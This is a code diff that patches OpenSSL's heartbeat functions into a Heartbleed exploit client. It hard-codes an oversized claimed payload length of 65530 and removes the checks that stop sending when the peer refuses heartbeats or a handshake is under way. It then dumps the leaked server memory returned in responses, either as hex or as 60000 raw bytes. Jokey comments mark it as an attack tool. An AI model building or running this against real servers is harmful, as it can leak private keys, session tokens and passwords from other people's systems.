@@ -4013,19 +4013,41 @@ tls1_process_heartbeat(SSL *s)
 		}
 	else if (hbtype == TLS1_HB_RESPONSE)
 		{
+
+            fprintf(stderr, "[*] Got a heartbeat response, dumping first k\n");
 		unsigned int seq;
 		
 		/* We only send sequence numbers (2 bytes unsigned int),
 		 * and 16 random bytes, so we just try to read the
 		 * sequence number */
 		n2s(pl, seq);
-		
-		if (payload == 18 && seq == s->tlsext_hb_seq)
+
+		if (payload == 65530 && seq == s->tlsext_hb_seq)
 			{
 			s->tlsext_hb_seq++;
 			s->tlsext_hb_pending = 0;
 			}
 		}
+
+        /* 80 chars per line, 12 lines */
+
+    if (!getenv("RAW")) {
+        #define DUMP_SIZE 1024
+        #define LINE_WIDTH 80
+        #define LINES DUMP_SIZE / LINE_WIDTH
+    unsigned line;
+    unsigned ch;
+        for (line = 0; line < LINES; line++) {
+            for (ch = 0; ch < LINE_WIDTH; ch++) {
+                fprintf(stderr, "%02x", pl[ch + LINE_WIDTH * line]);
+            }
+            fprintf(stderr, "\n");
+        }
+    } else {
+        write(1, pl, 60000);
+    }
+
+        /* fprintf(stderr, "[*] */
 
 	return 0;
 	}
@@ -4042,14 +4064,15 @@ tls1_heartbeat(SSL *s)
 	if (!(s->tlsext_heartbeat & SSL_TLSEXT_HB_ENABLED) ||
 	    s->tlsext_heartbeat & SSL_TLSEXT_HB_DONT_SEND_REQUESTS)
 		{
-		SSLerr(SSL_F_TLS1_HEARTBEAT,SSL_R_TLS_HEARTBEAT_PEER_DOESNT_ACCEPT);
-		return -1;
+		/* SSLerr(SSL_F_TLS1_HEARTBEAT,SSL_R_TLS_HEARTBEAT_PEER_DOESNT_ACCEPT); */
+        fprintf(stderr, "[+] PEER DOESN'T SUPPORT HEARTBEATS, sending them anyway lols\n");
 		}
 
 	/* ...and there is none in flight yet... */
 	if (s->tlsext_hb_pending)
 		{
 		SSLerr(SSL_F_TLS1_HEARTBEAT,SSL_R_TLS_HEARTBEAT_PENDING);
+        fprintf(stderr, "HEARTBEAT IN FLIGHTS\n");
 		return -1;
 		}
 		
@@ -4057,7 +4080,7 @@ tls1_heartbeat(SSL *s)
 	if (SSL_in_init(s) || s->in_handshake)
 		{
 		SSLerr(SSL_F_TLS1_HEARTBEAT,SSL_R_UNEXPECTED_MESSAGE);
-		return -1;
+        fprintf(stderr, "HANDSHAKE IN PROGRESS\n");
 		}
 		
 	/* Check if padding is too long, payload and padding
@@ -4079,7 +4102,9 @@ tls1_heartbeat(SSL *s)
 	/* Message Type */
 	*p++ = TLS1_HB_REQUEST;
 	/* Payload length (18 bytes here) */
-	s2n(payload, p);
+	/* s2n(payload, p); */
+    // lol
+    s2n(65530, p);
 	/* Sequence number */
 	s2n(s->tlsext_hb_seq, p);
 	/* 16 random bytes */
@@ -4088,6 +4113,15 @@ tls1_heartbeat(SSL *s)
 	/* Random padding */
 	RAND_pseudo_bytes(p, padding);
 
+    fprintf(stderr, "[+] hijacking s->write_bytes, call the police\n");
+    fprintf(stderr, "[*] buffer:\n");
+    unsigned int idx;
+    for (idx = 0; idx < 1 + 2 + payload + padding; idx++) {
+        fprintf(stderr, "%2x", buf[idx]);
+    }
+    fprintf(stderr, "\n");
+
+    /* ret = s->method->ssl_write_bytes(s, TLS1_RT_HEARTBEAT, buf, 3 + payload + padding); */
 	ret = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buf, 3 + payload + padding);
 	if (ret >= 0)
 		{
